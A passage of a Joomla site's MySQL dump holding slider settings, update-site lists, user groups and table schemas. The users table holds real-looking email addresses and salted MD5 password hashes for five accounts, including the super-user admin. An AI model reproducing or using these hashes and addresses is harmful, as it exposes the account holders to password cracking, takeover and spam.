) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='Contains core content data in name spaced fields' AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_uniterevolution_sliders`
--

CREATE TABLE IF NOT EXISTS `j6kpf_uniterevolution_sliders` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `alias` varchar(255) NOT NULL DEFAULT '',
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `j6kpf_uniterevolution_sliders`
--

INSERT INTO `j6kpf_uniterevolution_sliders` (`id`, `title`, `alias`, `published`, `ordering`, `params`) VALUES
(1, 'home page slider', '', 1, 0, '{"slider_type":"fullwidth","slider_width":"980","slider_height":"320","responsitive_w1":"940","responsitive_sw1":"770","responsitive_w2":"780","responsitive_sw2":"500","responsitive_w3":"510","responsitive_sw3":"310","responsitive_w4":"","responsitive_sw4":"","responsitive_w5":"","responsitive_sw5":"","responsitive_w6":"","responsitive_sw6":"","delay":"9000","touchenabled":"on","stop_on_hover":"on","shuffle":"off","php_resize":"off","load_googlefont":"false","google_font":"PT+Sans+Narrow:400,700","stop_slider":"off","stop_after_loops":"0","stop_at_slide":"2","position":"center","margin_top":"0","margin_bottom":"0","margin_left":"0","margin_right":"0","clear_both":"true","shadow_type":"0","show_timerbar":"false","timebar_position":"top","background_color":"#E9E9E9","padding":"5","show_background_image":"false","background_image":"","navigaion_type":"none","navigation_arrows":"none","navigation_style":"round","navigaion_align_hor":"center","navigaion_align_vert":"bottom","navigaion_offset_hor":"0","navigaion_offset_vert":"20","navigaion_always_on":"false","hide_thumbs":"200","thumb_width":"100","thumb_height":"50","thumb_amount":"5","hide_slider_under":"0","hide_defined_layers_under":"0","hide_all_layers_under":"0"}');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_uniterevolution_slides`
--

CREATE TABLE IF NOT EXISTS `j6kpf_uniterevolution_slides` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `catid` int(10) unsigned NOT NULL DEFAULT '0',
  `sliderid` int(10) unsigned NOT NULL DEFAULT '0',
  `title` varchar(255) NOT NULL,
  `alias` varchar(255) NOT NULL DEFAULT '',
  `image` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  `layers` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `catid` (`catid`,`published`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=5 ;

--
-- Dumping data for table `j6kpf_uniterevolution_slides`
--

INSERT INTO `j6kpf_uniterevolution_slides` (`id`, `catid`, `sliderid`, `title`, `alias`, `image`, `description`, `published`, `checked_out`, `checked_out_time`, `ordering`, `params`, `layers`) VALUES
(1, 0, 1, 'Slide', '', 'images/slideshow/mining.jpg', '', 1, 0, '0000-00-00 00:00:00', 1, '{"title":"Slide","published":"1","slide_transition":"fade","slot_amount":"7","transition_rotation":"0","transition_duration":"300","delay":"","enable_link":"true","link_type":"regular","link":"\\/application-sectors\\/mining","link_open_in":"same","slide_link":"nothing","link_pos":"front","enable_video":"false","video_id":"","video_autoplay":"false","video_autoplay-input":"false","slide_thumb":"","alt_text":"","image":"images\\/slideshow\\/mining.jpg"}', '[]'),
(2, 0, 1, 'Slide', '', 'images/slideshow/oilandgas1.png', '', 1, 0, '0000-00-00 00:00:00', 2, '{"title":"Slide","published":"1","slide_transition":"fade","slot_amount":"7","transition_rotation":"0","transition_duration":"300","delay":"","enable_link":"true","link_type":"regular","link":"\\/application-sectors\\/oil-and-gas","link_open_in":"same","slide_link":"nothing","link_pos":"front","enable_video":"false","video_id":"","video_autoplay":"false","video_autoplay-input":"false","slide_thumb":"","alt_text":"","image":"images\\/slideshow\\/oilandgas1.png"}', '[]'),
(3, 0, 1, 'Slide', '', 'images/slideshow/power2.png', '', 1, 0, '0000-00-00 00:00:00', 3, '{"title":"Slide","published":"1","slide_transition":"fade","slot_amount":"7","transition_rotation":"0","transition_duration":"300","delay":"","enable_link":"true","link_type":"regular","link":"\\/application-sectors\\/power","link_open_in":"same","slide_link":"nothing","link_pos":"front","enable_video":"false","video_id":"","video_autoplay":"false","video_autoplay-input":"false","slide_thumb":"","alt_text":"","image":"images\\/slideshow\\/power2.png"}', '[]'),
(4, 0, 1, 'Slide', '', 'images/slideshow/water12.png', '', 1, 0, '0000-00-00 00:00:00', 4, '{"title":"Slide","published":"1","slide_transition":"fade","slot_amount":"7","transition_rotation":"0","transition_duration":"300","delay":"","enable_link":"true","link_type":"regular","link":"\\/application-sectors\\/water","link_open_in":"same","slide_link":"nothing","link_pos":"front","enable_video":"false","video_id":"","video_autoplay":"false","video_autoplay-input":"false","slide_thumb":"","alt_text":"","image":"images\\/slideshow\\/water12.png"}', '[]');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_update_sites`
--

CREATE TABLE IF NOT EXISTS `j6kpf_update_sites` (
  `update_site_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT '',
  `type` varchar(20) DEFAULT '',
  `location` text NOT NULL,
  `enabled` int(11) DEFAULT '0',
  `last_check_timestamp` bigint(20) DEFAULT '0',
  PRIMARY KEY (`update_site_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COMMENT='Update Sites' AUTO_INCREMENT=7 ;

--
-- Dumping data for table `j6kpf_update_sites`
--

INSERT INTO `j6kpf_update_sites` (`update_site_id`, `name`, `type`, `location`, `enabled`, `last_check_timestamp`) VALUES
(1, 'Joomla Core', 'collection', 'http://update.joomla.org/core/list.xml', 1, 1407481817),
(2, 'Joomla Extension Directory', 'collection', 'http://update.joomla.org/jed/list.xml', 0, 0),
(3, 'Accredited Joomla! Translations', 'collection', 'http://update.joomla.org/language/translationlist_3.xml', 1, 1407481817),
(4, 'JCE Editor Updates', 'extension', 'https://www.joomlacontenteditor.net/index.php?option=com_updates&view=update&format=xml&id=1\n        ', 0, 0),
(5, 'Foxcontact update site', 'extension', 'http://www.fox.ra.it/phocadownload/foxcontact.xml', 1, 1407481817),
(6, 'JCE Editor Updates', 'extension', 'https://www.joomlacontenteditor.net/index.php?option=com_updates&view=update&format=xml&id=1&file=extension.xml', 1, 1407481817);

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_update_sites_extensions`
--

CREATE TABLE IF NOT EXISTS `j6kpf_update_sites_extensions` (
  `update_site_id` int(11) NOT NULL DEFAULT '0',
  `extension_id` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`update_site_id`,`extension_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='Links extensions to update sites';

--
-- Dumping data for table `j6kpf_update_sites_extensions`
--

INSERT INTO `j6kpf_update_sites_extensions` (`update_site_id`, `extension_id`) VALUES
(1, 700),
(2, 700),
(3, 600),
(4, 10004),
(5, 10012),
(6, 10004);

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_updates`
--

CREATE TABLE IF NOT EXISTS `j6kpf_updates` (
  `update_id` int(11) NOT NULL AUTO_INCREMENT,
  `update_site_id` int(11) DEFAULT '0',
  `extension_id` int(11) DEFAULT '0',
  `name` varchar(100) DEFAULT '',
  `description` text NOT NULL,
  `element` varchar(100) DEFAULT '',
  `type` varchar(20) DEFAULT '',
  `folder` varchar(20) DEFAULT '',
  `client_id` tinyint(3) DEFAULT '0',
  `version` varchar(10) DEFAULT '',
  `data` text NOT NULL,
  `detailsurl` text NOT NULL,
  `infourl` text NOT NULL,
  PRIMARY KEY (`update_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COMMENT='Available Updates' AUTO_INCREMENT=58 ;

--
-- Dumping data for table `j6kpf_updates`
--

INSERT INTO `j6kpf_updates` (`update_id`, `update_site_id`, `extension_id`, `name`, `description`, `element`, `type`, `folder`, `client_id`, `version`, `data`, `detailsurl`, `infourl`) VALUES
(1, 1, 700, 'Joomla', '', 'joomla', 'file', '', 0, '3.2.4', '', 'http://update.joomla.org/core/sts/extension_sts.xml', ''),
(2, 3, 0, 'Malay', '', 'pkg_ms-MY', 'package', '', 0, '3.3.1.1', '', 'http://update.joomla.org/language/details3/ms-MY_details.xml', ''),
(3, 3, 0, 'Romanian', '', 'pkg_ro-RO', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/ro-RO_details.xml', ''),
(4, 3, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/nl-BE_details.xml', ''),
(5, 3, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/zh-TW_details.xml', ''),
(6, 3, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/fr-FR_details.xml', ''),
(7, 3, 0, 'Galician', '', 'pkg_gl-ES', 'package', '', 0, '3.3.1.2', '', 'http://update.joomla.org/language/details3/gl-ES_details.xml', ''),
(8, 3, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/de-DE_details.xml', ''),
(9, 3, 0, 'Greek', '', 'pkg_el-GR', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/el-GR_details.xml', ''),
(10, 3, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/ja-JP_details.xml', ''),
(11, 3, 0, 'Hebrew', '', 'pkg_he-IL', 'package', '', 0, '3.1.1.1', '', 'http://update.joomla.org/language/details3/he-IL_details.xml', ''),
(12, 3, 0, 'EnglishAU', '', 'pkg_en-AU', 'package', '', 0, '3.3.1.1', '', 'http://update.joomla.org/language/details3/en-AU_details.xml', ''),
(13, 3, 0, 'EnglishUS', '', 'pkg_en-US', 'package', '', 0, '3.3.1.1', '', 'http://update.joomla.org/language/details3/en-US_details.xml', ''),
(14, 3, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/hu-HU_details.xml', ''),
(15, 3, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '3.2.0.1', '', 'http://update.joomla.org/language/details3/af-ZA_details.xml', ''),
(16, 3, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '3.3.2.1', '', 'http://update.joomla.org/language/details3/ar-AA_details.xml', ''),
(17, 3, 0, 'Belarusian', '', 'pkg_be-BY', 'package', '', 0, '3.2.1.1', '', 'http://update.joomla.org/language/details3/be-BY_details.xml', ''),
(18, 3, 0, 'Bulgarian', '', 'pkg_bg-BG', 'package', '', 0, '3.3.0.1', '', 'http://update.joomla.org/language/details3/bg-BG_details.xml', ''),
(19, 3, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '3.3.2.1', '', 'http://update.joomla.org/language/details3/ca-ES_details.xml', ''),
(20, 3, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '3.3.1.1', '', 'http://update.joomla.org/language/details3/zh-CN_details.xml', ''),
(21, 3, 0, 'Croatian', '', 'pkg_hr-HR', 'package', '', 0, '3.1.5.1', '', 'http://update.joomla.org/language/details3/hr-HR_details.xml', ''),
(22, 3, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/cs-CZ_details.xml', ''),
(23, 3, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/da-DK_details.xml', ''),
(24, 3, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/nl-NL_details.xml', ''),
(25, 3, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '3.3.1.2', '', 'http://update.joomla.org/language/details3/et-EE_details.xml', ''),
(26, 3, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/it-IT_details.xml', ''),
(27, 3, 0, 'Korean', '', 'pkg_ko-KR', 'package', '', 0, '3.2.3.1', '', 'http://update.joomla.org/language/details3/ko-KR_details.xml', ''),
(28, 3, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/lv-LV_details.xml', ''),
(29, 3, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '3.3.2.1', '', 'http://update.joomla.org/language/details3/mk-MK_details.xml', ''),
(30, 3, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '3.2.2.1', '', 'http://update.joomla.org/language/details3/nb-NO_details.xml', ''),
(31, 3, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '3.3.1.1', '', 'http://update.joomla.org/language/details3/fa-IR_details.xml', ''),
(32, 3, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/pl-PL_details.xml', ''),
(33, 3, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/ru-RU_details.xml', ''),
(34, 3, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '3.3.1.1', '', 'http://update.joomla.org/language/details3/sk-SK_details.xml', ''),
(35, 3, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '3.3.3.3', '', 'http://update.joomla.org/language/details3/sv-SE_details.xml', ''),
(36, 3, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '3.3.2.1', '', 'http://update.joomla.org/language/details3/sy-IQ_details.xml', ''),
(37, 3, 0, 'Tamil', '', 'pkg_ta-IN', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/ta-IN_details.xml', ''),
(38, 3, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '3.3.2.1', '', 'http://update.joomla.org/language/details3/th-TH_details.xml', ''),
(39, 3, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '3.3.2.1', '', 'http://update.joomla.org/language/details3/tr-TR_details.xml', ''),
(40, 3, 0, 'Ukrainian', '', 'pkg_uk-UA', 'package', '', 0, '3.3.1.11', '', 'http://update.joomla.org/language/details3/uk-UA_details.xml', ''),
(41, 3, 0, 'Uyghur', '', 'pkg_ug-CN', 'package', '', 0, '3.3.0.1', '', 'http://update.joomla.org/language/details3/ug-CN_details.xml', ''),
(42, 3, 0, 'Albanian', '', 'pkg_sq-AL', 'package', '', 0, '3.1.1.1', '', 'http://update.joomla.org/language/details3/sq-AL_details.xml', ''),
(43, 3, 0, 'Portuguese Brazil', '', 'pkg_pt-BR', 'package', '', 0, '3.0.2.1', '', 'http://update.joomla.org/language/details3/pt-BR_details.xml', ''),
(44, 3, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/sr-YU_details.xml', ''),
(45, 3, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '3.3.1.3', '', 'http://update.joomla.org/language/details3/es-ES_details.xml', ''),
(46, 3, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/bs-BA_details.xml', ''),
(47, 3, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/sr-RS_details.xml', ''),
(48, 3, 0, 'Vietnamese', '', 'pkg_vi-VN', 'package', '', 0, '3.2.1.1', '', 'http://update.joomla.org/language/details3/vi-VN_details.xml', ''),
(49, 3, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '3.3.0.2', '', 'http://update.joomla.org/language/details3/id-ID_details.xml', ''),
(50, 3, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '3.3.2.1', '', 'http://update.joomla.org/language/details3/fi-FI_details.xml', ''),
(51, 3, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/sw-KE_details.xml', ''),
(52, 3, 0, 'Montenegrin', '', 'pkg_srp-ME', 'package', '', 0, '3.3.1.1', '', 'http://update.joomla.org/language/details3/srp-ME_details.xml', ''),
(53, 3, 0, 'EnglishCA', '', 'pkg_en-CA', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/en-CA_details.xml', ''),
(54, 3, 0, 'FrenchCA', '', 'pkg_fr-CA', 'package', '', 0, '3.3.3.1', '', 'http://update.joomla.org/language/details3/fr-CA_details.xml', ''),
(55, 3, 0, 'Welsh', '', 'pkg_cy-GB', 'package', '', 0, '3.3.0.1', '', 'http://update.joomla.org/language/details3/cy-GB_details.xml', ''),
(56, 3, 0, 'Sinhala', '', 'pkg_si-LK', 'package', '', 0, '3.3.1.1', '', 'http://update.joomla.org/language/details3/si-LK_details.xml', ''),
(57, 5, 0, 'Fox Contact', 'Fox Contact', 'mod_foxcontact', 'module', '', 1, '2.0.7', '', 'http://www.fox.ra.it/phocadownload/foxcontact.xml', 'http://www.fox.ra.it/joomla-extensions/fox-contact-form.html');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_user_notes`
--

CREATE TABLE IF NOT EXISTS `j6kpf_user_notes` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `catid` int(10) unsigned NOT NULL DEFAULT '0',
  `subject` varchar(100) NOT NULL DEFAULT '',
  `body` text NOT NULL,
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `created_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_user_id` int(10) unsigned NOT NULL,
  `modified_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `review_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `idx_user_id` (`user_id`),
  KEY `idx_category_id` (`catid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_user_profiles`
--

CREATE TABLE IF NOT EXISTS `j6kpf_user_profiles` (
  `user_id` int(11) NOT NULL,
  `profile_key` varchar(100) NOT NULL,
  `profile_value` varchar(255) NOT NULL,
  `ordering` int(11) NOT NULL DEFAULT '0',
  UNIQUE KEY `idx_user_id_profile_key` (`user_id`,`profile_key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='Simple user profile storage table';

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_user_usergroup_map`
--

CREATE TABLE IF NOT EXISTS `j6kpf_user_usergroup_map` (
  `user_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'Foreign Key to #__users.id',
  `group_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'Foreign Key to #__usergroups.id',
  PRIMARY KEY (`user_id`,`group_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `j6kpf_user_usergroup_map`
--

INSERT INTO `j6kpf_user_usergroup_map` (`user_id`, `group_id`) VALUES
(32, 8),
(33, 2),
(34, 2),
(35, 2),
(36, 2);

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_usergroups`
--

CREATE TABLE IF NOT EXISTS `j6kpf_usergroups` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Primary Key',
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'Adjacency List Reference Id',
  `lft` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set lft.',
  `rgt` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set rgt.',
  `title` varchar(100) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_usergroup_parent_title_lookup` (`parent_id`,`title`),
  KEY `idx_usergroup_title_lookup` (`title`),
  KEY `idx_usergroup_adjacency_lookup` (`parent_id`),
  KEY `idx_usergroup_nested_set_lookup` (`lft`,`rgt`) USING BTREE
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=10 ;

--
-- Dumping data for table `j6kpf_usergroups`
--

INSERT INTO `j6kpf_usergroups` (`id`, `parent_id`, `lft`, `rgt`, `title`) VALUES
(1, 0, 1, 18, 'Public'),
(2, 1, 8, 15, 'Registered'),
(3, 2, 9, 14, 'Author'),
(4, 3, 10, 13, 'Editor'),
(5, 4, 11, 12, 'Publisher'),
(6, 1, 4, 7, 'Manager'),
(7, 6, 5, 6, 'Administrator'),
(8, 1, 16, 17, 'Super Users'),
(9, 1, 2, 3, 'Guest');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_users`
--

CREATE TABLE IF NOT EXISTS `j6kpf_users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `username` varchar(150) NOT NULL DEFAULT '',
  `email` varchar(100) NOT NULL DEFAULT '',
  `password` varchar(100) NOT NULL DEFAULT '',
  `block` tinyint(4) NOT NULL DEFAULT '0',
  `sendEmail` tinyint(4) DEFAULT '0',
  `registerDate` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `lastvisitDate` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `activation` varchar(100) NOT NULL DEFAULT '',
  `params` text NOT NULL,
  `lastResetTime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT 'Date of last password reset',
  `resetCount` int(11) NOT NULL DEFAULT '0' COMMENT 'Count of password resets since lastResetTime',
  PRIMARY KEY (`id`),
  KEY `idx_name` (`name`),
  KEY `idx_block` (`block`),
  KEY `username` (`username`),
  KEY `email` (`email`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=37 ;

--
-- Dumping data for table `j6kpf_users`
--

INSERT INTO `j6kpf_users` (`id`, `name`, `username`, `email`, `password`, `block`, `sendEmail`, `registerDate`, `lastvisitDate`, `activation`, `params`, `lastResetTime`, `resetCount`) VALUES
(32, 'Super User', 'admin', 'pradeep@binarix.com', '513a1d63dd897509e0dac72d493e909b:YBDJHOAqX222H91b71t2NtRiyJScp5UR', 0, 1, '2013-04-11 03:55:16', '2014-08-08 07:13:36', '0', '', '0000-00-00 00:00:00', 0),
(33, 'memberj', 'memberj', 'cruft@list.ru', '57e5c61d7a374750489f9b0e7ffba9ad:ceqidPSxfCiAnUT7LIGRTmepgLpipIZM', 1, 0, '2013-12-07 10:16:35', '0000-00-00 00:00:00', '44abe93ada333b342d966b91e91805c6', '{}', '0000-00-00 00:00:00', 0),
(34, 'buttposipte', 'berfegoden', 'berfegoden@my-new-mail.ru', '228c13bb3e340e3b79c3f437691b8474:ES1uk8zjafclIXTonaIJ2n4msoZO9PRh', 0, 0, '2014-09-07 02:45:46', '0000-00-00 00:00:00', '', '{}', '0000-00-00 00:00:00', 0),
(35, 'Admin Inside', 'inside', 'joomlas.xxxxx@gmail.com', '08927ffcb2273b28e57e3c0fa2b33eca:vWoflI8H90Rq8YYqXLlzTreb3QdMAGM6', 0, 0, '2014-09-27 12:02:11', '0000-00-00 00:00:00', '', '{}', '0000-00-00 00:00:00', 0),
(36, 'Eusmtuhus', 'Eusmtuhus', 'evgensidorov49@yandex.ru', '26d663bcd6730f5ebe0c8dedb2f4443b:W2LJYrFtoRhkZOBwApjTYSXc6TIY3qpL', 1, 0, '2014-12-26 13:14:11', '0000-00-00 00:00:00', '01a528aa07645a35ece4649ec8d0c19f', '{}', '0000-00-00 00:00:00', 0);

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_viewlevels`
--

CREATE TABLE IF NOT EXISTS `j6kpf_viewlevels` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Primary Key',
  `title` varchar(100) NOT NULL DEFAULT '',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `rules` varchar(5120) NOT NULL COMMENT 'JSON encoded access control.',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_assetgroup_title_lookup` (`title`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `j6kpf_viewlevels`
--

INSERT INTO `j6kpf_viewlevels` (`id`, `title`, `ordering`, `rules`) VALUES
(1, 'Public', 0, '[1]'),
(2, 'Registered', 1, '[6,2,8]'),
(3, 'Special', 2, '[6,3,8]'),
(5, 'Guest', 0, '[9]');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_weblinks`
--

CREATE TABLE IF NOT EXISTS `j6kpf_weblinks` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `catid` int(11) NOT NULL DEFAULT '0',
  `title` varchar(250) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `url` varchar(250) NOT NULL DEFAULT '',
  `description` text NOT NULL,
  `hits` int(11) NOT NULL DEFAULT '0',
  `state` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(11) NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `access` int(11) NOT NULL DEFAULT '1',
  `params` text NOT NULL,
  `language` char(7) NOT NULL DEFAULT '',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `metadata` text NOT NULL,
  `featured` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT 'Set if link is featured.',
  `xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  `images` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`state`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`),
  KEY `idx_featured_catid` (`featured`,`catid`),
  KEY `idx_language` (`language`),
  KEY `idx_xreference` (`xreference`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_wf_profiles`
--

CREATE TABLE IF NOT EXISTS `j6kpf_wf_profiles` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `users` text NOT NULL,
  `types` text NOT NULL,
  `components` text NOT NULL,
  `area` tinyint(3) NOT NULL,
  `device` varchar(255) NOT NULL,
  `rows` text NOT NULL,
  `plugins` text NOT NULL,
  `published` tinyint(3) NOT NULL,
  `ordering` int(11) NOT NULL,
  `checked_out` tinyint(3) NOT NULL,
  `checked_out_time` datetime NOT NULL,
  `params` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=5 ;

--
-- Dumping data for table `j6kpf_wf_profiles`
--

INSERT INTO `j6kpf_wf_profiles` (`id`, `name`, `description`, `users`, `types`, `components`, `area`, `device`, `rows`, `plugins`, `published`, `ordering`, `checked_out`, `checked_out_time`, `params`) VALUES
(1, 'Default', 'Default Profile for all users', '', '6,7,3,4,5,8', '', 0, 'desktop,tablet,phone', 'help,newdocument,undo,redo,spacer,bold,italic,underline,strikethrough,justifyfull,justifycenter,justifyleft,justifyright,spacer,blockquote,formatselect,styleselect,removeformat,cleanup;fontselect,fontsizeselect,forecolor,backcolor,spacer,clipboard,indent,outdent,lists,sub,sup,textcase,charmap,hr;directionality,fullscreen,preview,source,print,searchreplace,spacer,table;visualaid,visualchars,visualblocks,nonbreaking,style,xhtmlxtras,anchor,unlink,link,imgmanager,spellchecker,article', 'contextmenu,browser,inlinepopups,media,help,clipboard,searchreplace,directionality,fullscreen,preview,source,table,textcase,print,style,nonbreaking,visualchars,visualblocks,xhtmlxtras,imgmanager,anchor,link,spellchecker,article,lists,charmap,formatselect,styleselect,fontselect,fontsizeselect,fontcolor', 1, 1, 0, '0000-00-00 00:00:00', '{"lists":{"buttons":["numlist","bullist"]},"editor":{"max_size":"8192"}}'),
